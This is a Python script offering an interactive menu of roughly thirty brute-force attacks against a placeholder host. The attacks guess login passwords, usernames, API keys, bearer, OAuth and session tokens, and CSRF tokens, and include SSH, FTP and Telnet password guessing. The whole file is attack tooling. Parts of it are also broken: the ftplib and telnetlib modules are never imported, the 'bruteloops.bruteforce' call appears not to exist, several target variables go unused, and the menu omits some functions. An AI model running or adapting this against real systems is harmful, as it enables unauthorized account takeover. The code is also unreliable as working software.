import bruteloops
import paramiko
import requests
from requests.auth import HTTPBasicAuth, HTTPDigestAuth

def brute_force_password():
    charset = 'abcdefghijklmnopqrstuvwxyz'
    max_length = 5
    url = 'https://example.com/api/login'
    username = 'user'

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.post(url, json={'username': username, 'password': combination})
        if response.status_code == 200:
            print(f'Valid password found: {combination}')
            break
    else:
        print('Valid password not found')

def brute_force_api_key():
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    max_length = 5
    url = 'https://example.com/api'
    target_key = 'abcde'

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.get(url, headers={'Authorization': f'Bearer {combination}'})
        if response.status_code == 200:
            print(f'Valid API key found: {combination}')
            break
    else:
        print('Valid API key not found')

def brute_force_username():
    charset = 'abcdefghijklmnopqrstuvwxyz'
    max_length = 5
    url = 'https://example.com/api/login'
    password = 'password123'

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.post(url, json={'username': combination, 'password': password})
        if response.status_code == 200:
            print(f'Valid username found: {combination}')
            break
    else:
        print('Valid username not found')

def brute_force_token():
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    max_length = 10
    url = 'https://example.com/api/resource'
    target_token = 'abc123def4'

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.get(url, headers={'Authorization': f'Token {combination}'})
        if response.status_code == 200:
            print(f'Valid token found: {combination}')
            break
    else:
        print('Valid token not found')

def brute_force_session_id():
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    max_length = 10
    url = 'https://example.com/api/resource'
    target_session_id = 'abc123def4'

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.get(url, cookies={'session_id': combination})
        if response.status_code == 200:
            print(f'Valid session ID found: {combination}')
            break
    else:
        print('Valid session ID not found')

def brute_force_csrf_token():
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    max_length = 10
    url = 'https://example.com/api/resource'
    target_csrf_token = 'abc123def4'

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.post(url, headers={'X-CSRF-Token': combination})
        if response.status_code == 200:
            print(f'Valid CSRF token found: {combination}')
            break
    else:
        print('Valid CSRF token not found')

def brute_force_api_endpoint():
    charset = 'abcdefghijklmnopqrstuvwxyz'
    max_length = 5
    base_url = 'https://example.com/api/'

    for combination in bruteloops.bruteforce(charset, max_length):
        url = base_url + combination
        response = requests.get(url)
        if response.status_code == 200:
            print(f'Valid API endpoint found: {url}')
            break
    else:
        print('Valid API endpoint not found')

def brute_force_query_parameter():
    charset = 'abcdefghijklmnopqrstuvwxyz'
    max_length = 5
    url = 'https://example.com/api/resource?param='

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.get(url + combination)
        if response.status_code == 200:
            print(f'Valid query parameter found: {combination}')
            break
    else:
        print('Valid query parameter not found')

def brute_force_header_value():
    charset = 'abcdefghijklmnopqrstuvwxyz'
    max_length = 5
    url = 'https://example.com/api/resource'
    header_name = 'X-Custom-Header'

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.get(url, headers={header_name: combination})
        if response.status_code == 200:
            print(f'Valid header value found: {combination}')
            break
    else:
        print('Valid header value not found')

def brute_force_form_field():
    charset = 'abcdefghijklmnopqrstuvwxyz'
    max_length = 5
    url = 'https://example.com/api/form'
    field_name = 'custom_field'

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.post(url, data={field_name: combination})
        if response.status_code == 200:
            print(f'Valid form field value found: {combination}')
            break
    else:
        print('Valid form field value not found')

def brute_force_json_field():
    charset = 'abcdefghijklmnopqrstuvwxyz'
    max_length = 5
    url = 'https://example.com/api/json'
    field_name = 'custom_field'

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.post(url, json={field_name: combination})
        if response.status_code == 200:
            print(f'Valid JSON field value found: {combination}')
            break
    else:
        print('Valid JSON field value not found')

def brute_force_url_path():
    charset = 'abcdefghijklmnopqrstuvwxyz'
    max_length = 5
    base_url = 'https://example.com/api/'

    for combination in bruteloops.bruteforce(charset, max_length):
        url = base_url + combination
        response = requests.get(url)
        if response.status_code == 200:
            print(f'Valid URL path found: {url}')
            break
    else:
        print('Valid URL path not found')

def brute_force_subdomain():
    charset = 'abcdefghijklmnopqrstuvwxyz'
    max_length = 5
    base_url = '.example.com/api/resource'

    for combination in bruteloops.bruteforce(charset, max_length):
        url = 'https://' + combination + base_url
        response = requests.get(url)
        if response.status_code == 200:
            print(f'Valid subdomain found: {url}')
            break
    else:
        print('Valid subdomain not found')

def brute_force_http_method():
    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
    url = 'https://example.com/api/resource'

    for method in methods:
        response = requests.request(method, url)
        if response.status_code == 200:
            print(f'Valid HTTP method found: {method}')
            break
    else:
        print('Valid HTTP method not found')

def brute_force_content_type():
    content_types = ['application/json', 'application/xml', 'text/plain']
    url = 'https://example.com/api/resource'

    for content_type in content_types:
        response = requests.get(url, headers={'Content-Type': content_type})
        if response.status_code == 200:
            print(f'Valid Content-Type found: {content_type}')
            break
    else:
        print('Valid Content-Type not found')

def brute_force_accept_header():
    accept_headers = ['application/json', 'application/xml', 'text/plain']
    url = 'https://example.com/api/resource'

    for accept in accept_headers:
        response = requests.get(url, headers={'Accept': accept})
        if response.status_code == 200:
            print(f'Valid Accept header found: {accept}')
            break
    else:
        print('Valid Accept header not found')

def brute_force_user_agent():
    user_agents = ['Mozilla/5.0', 'curl/7.68.0', 'PostmanRuntime/7.26.8']
    url = 'https://example.com/api/resource'

    for user_agent in user_agents:
        response = requests.get(url, headers={'User-Agent': user_agent})
        if response.status_code == 200:
            print(f'Valid User-Agent found: {user_agent}')
            break
    else:
        print('Valid User-Agent not found')

def brute_force_referrer():
    referrers = ['https://google.com', 'https://example.com', 'https://bing.com']
    url = 'https://example.com/api/resource'

    for referrer in referrers:
        response = requests.get(url, headers={'Referer': referrer})
        if response.status_code == 200:
            print(f'Valid Referrer found: {referrer}')
            break
    else:
        print('Valid Referrer not found')

def brute_force_origin():
    origins = ['https://google.com', 'https://example.com', 'https://bing.com']
    url = 'https://example.com/api/resource'

    for origin in origins:
        response = requests.get(url, headers={'Origin': origin})
        if response.status_code == 200:
            print(f'Valid Origin found: {origin}')
            break
    else:
        print('Valid Origin not found')

def brute_force_cookie_value():
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    max_length = 5
    url = 'https://example.com/api/resource'
    cookie_name = 'session_id'

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.get(url, cookies={cookie_name: combination})
        if response.status_code == 200:
            print(f'Valid cookie value found: {combination}')
            break
    else:
        print('Valid cookie value not found')

def brute_force_basic_auth_password():
    charset = 'abcdefghijklmnopqrstuvwxyz'
    max_length = 5
    url = 'https://example.com/api/resource'
    username = 'user'

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.get(url, auth=HTTPBasicAuth(username, combination))
        if response.status_code == 200:
            print(f'Valid password found: {combination}')
            break
    else:
        print('Valid password not found')

def brute_force_basic_auth_username():
    charset = 'abcdefghijklmnopqrstuvwxyz'
    max_length = 5
    url = 'https://example.com/api/resource'
    password = 'password123'

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.get(url, auth=HTTPBasicAuth(combination, password))
        if response.status_code == 200:
            print(f'Valid username found: {combination}')
            break
    else:
        print('Valid username not found')

def brute_force_bearer_token():
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    max_length = 10
    url = 'https://example.com/api/resource'
    target_token = 'abc123def4'

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.get(url, headers={'Authorization': f'Bearer {combination}'})
        if response.status_code == 200:
            print(f'Valid Bearer token found: {combination}')
            break
    else:
        print('Valid Bearer token not found')

def brute_force_digest_auth_password():
    charset = 'abcdefghijklmnopqrstuvwxyz'
    max_length = 5
    url = 'https://example.com/api/resource'
    username = 'user'

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.get(url, auth=HTTPDigestAuth(username, combination))
        if response.status_code == 200:
            print(f'Valid password found: {combination}')
            break
    else:
        print('Valid password not found')

def brute_force_digest_auth_username():
    charset = 'abcdefghijklmnopqrstuvwxyz'
    max_length = 5
    url = 'https://example.com/api/resource'
    password = 'password123'

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.get(url, auth=HTTPDigestAuth(combination, password))
        if response.status_code == 200:
            print(f'Valid username found: {combination}')
            break
    else:
        print('Valid username not found')

def brute_force_oauth_token():
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    max_length = 10
    url = 'https://example.com/api/resource'
    target_token = 'abc123def4'

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.get(url, headers={'Authorization': f'OAuth {combination}'})
        if response.status_code == 200:
            print(f'Valid OAuth token found: {combination}')
            break
    else:
        print('Valid OAuth token not found')

def brute_force_api_key_in_query_parameter():
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    max_length = 5
    url = 'https://example.com/api/resource?api_key='

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.get(url + combination)
        if response.status_code == 200:
            print(f'Valid API key found: {combination}')
            break
    else:
        print('Valid API key not found')

def brute_force_api_key_in_header():
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    max_length = 5
    url = 'https://example.com/api/resource'
    header_name = 'X-API-Key'

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.get(url, headers={header_name: combination})
        if response.status_code == 200:
            print(f'Valid API key found: {combination}')
            break
    else:
        print('Valid API key not found')

def brute_force_api_key_in_cookie():
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    max_length = 5
    url = 'https://example.com/api/resource'
    cookie_name = 'api_key'

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.get(url, cookies={cookie_name: combination})
        if response.status_code == 200:
            print(f'Valid API key found: {combination}')
            break
    else:
        print('Valid API key not found')

def brute_force_api_key_in_form_data():
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    max_length = 5
    url = 'https://example.com/api/resource'
    field_name = 'api_key'

    for combination in bruteloops.bruteforce(charset, max_length):
        response = requests.post(url, data={field_name: combination})
        if response.status_code == 200:
            print(f'Valid API key found: {combination}')
            break
    else:
        print('Valid API key not found')

def brute_force_ssh():
    charset = 'abcdefghijklmnopqrstuvwxyz'
    max_length = 5
    hostname = 'example.com'
    port = 22
    username = 'user'

    for combination in bruteloops.bruteforce(charset, max_length):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname, port=port, username=username, password=combination)
            print(f'Valid SSH password found: {combination}')
            ssh.close()
            break
        except paramiko.AuthenticationException:
            continue
    else:
        print('Valid SSH password not found')
        
def brute_force_ftp():
    charset = 'abcdefghijklmnopqrstuvwxyz'
    max_length = 5
    hostname = 'ftp.example.com'
    port = 21
    username = 'user'

    for combination in bruteloops.bruteforce(charset, max_length):
        try:
            ftp = ftplib.FTP()
            ftp.connect(hostname, port)
            ftp.login(username, combination)
            print(f'Valid FTP password found: {combination}')
            ftp.quit()
            break
        except ftplib.error_perm:
            continue
    else:
        print('Valid FTP password not found')

def brute_force_telnet():
    charset = 'abcdefghijklmnopqrstuvwxyz'
    max_length = 5
    hostname = 'telnet.example.com'
    port = 23
    username = 'user'

    for combination in bruteloops.bruteforce(charset, max_length):
        try:
            telnet = telnetlib.Telnet(hostname, port)
            telnet.read_until(b"login: ")
            telnet.write(username.encode('ascii') + b"\n")
            telnet.read_until(b"Password: ")
            telnet.write(combination.encode('ascii') + b"\n")
            result = telnet.read_some()
            if b"Last login" in result:
                print(f'Valid Telnet password found: {combination}')
                telnet.close()
                break
        except:
            continue
    else:
        print('Valid Telnet password not found')

def main():
    options = [
        "Brute Force Password",
        "Brute Force API Key",
        "Brute Force Username",
        "Brute Force Token",
        "Brute Force Session ID",
        "Brute Force CSRF Token",
        "Brute Force API Endpoint",
        "Brute Force Query Parameter",
        "Brute Force Header Value",
        "Brute Force Form Field",
        "Brute Force JSON Field",
        "Brute Force URL Path",
        "Brute Force Subdomain",
        "Brute Force HTTP Method",
        "Brute Force Content-Type",
        "Brute Force Accept Header",
        "Brute Force User-Agent",
        "Brute Force Referrer",
        "Brute Force Origin",
        "Brute Force Cookie Value",
        "Brute Force Basic Auth Password",
        "Brute Force Basic Auth Username",
        "Brute Force Bearer Token",
        "Brute Force Digest Auth Password",
        "Brute Force Digest Auth Username",
        "Brute Force OAuth Token",
        "Brute Force API Key in Query Parameter",
        "Brute Force API Key in Header",
        "Brute Force API Key in Cookie",
        "Brute Force API Key in Form Data",
        "Brute Force SSH Password"
    ]

    functions = [
        brute_force_password,
        brute_force_api_key,
        brute_force_username,
        brute_force_token,
        brute_force_session_id,
        brute_force_csrf_token,
        brute_force_api_endpoint,
        brute_force_query_parameter,
        brute_force_header_value,
        brute_force_form_field,
        brute_force_json_field,
        brute_force_url_path,
        brute_force_subdomain,
        brute_force_http_method,
        brute_force_content_type,
        brute_force_accept_header,
        brute_force_user_agent,
        brute_force_referrer,
        brute_force_origin,
        brute_force_cookie_value,
        brute_force_basic_auth_password,
        brute_force_basic_auth_username,
        brute_force_bearer_token,
        brute_force_digest_auth_password,
        brute_force_digest_auth_username,
        brute_force_oauth_token,
        brute_force_api_key_in_query_parameter,
        brute_force_api_key_in_header,
        brute_force_api_key_in_cookie,
        brute_force_api_key_in_form_data,
        brute_force_ssh
    ]

    while True:
        print("\nSelect a test to run:")
        for i, option in enumerate(options, 1):
            print(f"{i}. {option}")
        print("0. Exit")

        choice = int(input("Enter your choice: "))
        if choice == 0:
            break
        elif 1 <= choice <= len(options):
            functions[choice - 1]()
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    main()